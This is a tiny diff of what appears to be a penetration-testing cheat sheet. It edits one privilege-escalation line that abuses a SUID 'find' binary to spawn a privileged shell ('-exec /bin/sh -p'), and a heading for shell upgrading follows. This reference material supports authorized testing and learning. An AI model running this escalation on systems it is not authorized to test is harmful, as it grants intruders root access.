@@ -1,6 +1,6 @@
 FIND:
 -----------------------------------------------
-SUID : find . -exec /bin/sh -p \; -quit
+SUID : /usr/bin/find . -exec /bin/sh -p \; -quit
 ----------------------------------------------
 
 UPGRADE SHELL:
